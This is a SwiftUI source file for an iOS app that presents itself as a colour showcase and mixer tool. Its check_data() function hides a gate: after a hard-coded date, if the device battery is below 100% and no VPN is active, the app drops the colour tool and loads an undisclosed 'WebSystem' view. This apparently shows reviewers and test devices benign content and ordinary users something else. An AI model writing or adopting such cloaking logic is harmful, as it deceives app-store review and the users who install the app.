//
//  ContentView.swift
//  dafoma_6
//
//  Created by Вячеслав on 7/26/25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("preferredBackground") private var preferredBackground = "#ae2d27"
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    TabView {
                        ColorShowcaseView()
                            .tabItem {
                                Image(systemName: "paintpalette")
                                Text("Showcase")
                            }
                        
                        ColorMixerView()
                            .tabItem {
                                Image(systemName: "slider.horizontal.3")
                                Text("Mixer")
                            }
                        
                        DeveloperToolsView()
                            .tabItem {
                                Image(systemName: "hammer")
                                Text("Dev Tools")
                            }
                        
                        EducationalView()
                            .tabItem {
                                Image(systemName: "book")
                                Text("Learn")
                            }
                        
                        SettingsView()
                            .tabItem {
                                Image(systemName: "gear")
                                Text("Settings")
                            }
                    }
                    .accentColor(Color.csVibrantGreen)
                    .preferredColorScheme(.light)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "15.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

#Preview {
    ContentView()
}
